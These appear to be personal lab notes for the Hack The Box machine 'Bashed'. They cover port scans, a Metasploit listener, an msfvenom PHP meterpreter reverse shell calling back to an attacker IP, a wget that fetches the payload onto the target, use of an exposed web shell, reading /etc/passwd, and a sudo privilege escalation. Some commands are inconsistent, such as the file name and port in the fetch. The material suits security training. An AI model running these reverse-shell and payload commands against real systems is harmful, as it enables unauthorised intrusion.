<h1>Bashed 10.10.10.68<h1>

<h2>Info</h2>
  nmap -Pn -p- -vv 10.10.10.68 -oX bashed.xml

  host         port  proto  name  state  info
  ----         ----  -----  ----  -----  ----
  10.10.10.68  80    tcp    http  open   Apache httpd 2.4.18 (Ubuntu)

<h2>Nikto</h2>
  Server: Apache/2.4.18 (Ubuntu)
  + Server leaks inodes via ETags, header found with file /uploads/, fields: 0xe 0x55f89c79ffc7f
  + The anti-clickjacking X-Frame-Options header is not present.
  + Allowed HTTP Methods: GET, HEAD, POST, OPTIONS

<h2>Backdooring</h2>

lhost: 10.10.14.105

Setting up listener:
  use exploit/multi/handler
  set payload php/meterpreter_reverse_tcp
  set lhost 10.10.14.105
  set lport 4441
  run -z

Creating Payload:
  msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.105 LPORT=4441 -f php > shell4441.php

Start http server on LHOST
  python -m SimpleHTTPServer 8080

Then wget file on rhost
  wget http://10.10.14.105/shell4441.elf

<h2>Walktrough</h2>
  Go to: http://10.10.10.68/dev/phpbash.php
    cat /home/arrexel/user.txt
      2c281f318555dbc1b856957c7147bfc1

  <www-data@bashed:/var/www/html/dev#> sudo -l
    Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: all

  <www-data@bashed:/var/www/html/dev#> ls -la /
    ...
    drwxr-xr-x 2 root root 4096 Dec 4 11:18 sbin
    drwxrwxr-- 2 scriptmanager scriptmanager 4096 Dec 4 18:06 scripts
    drwxr-xr-x 2 root root 4096 Feb 15 2017 srv
    ...

  <www-data@bashed:/var/www/html/#>cat /etc/passwd
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
    systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
    systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
    systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
    syslog:x:104:108::/home/syslog:/bin/false
    _apt:x:105:65534::/nonexistent:/bin/false
    messagebus:x:106:110::/var/run/dbus:/bin/false
    uuidd:x:107:111::/run/uuidd:/bin/false
    arrexel:x:1000:1000:arrexel,,,:/home/arrexel:/bin/bash
    scriptmanager:x:1001:1001:,,,:/home/scriptmanager:/bin/bash


  Use wget (HTTP server on lhost first) setup to put shell that gives tty in /var/www/html/uploads eg. meterpreter
  then <sudo -u scriptmanager -i >
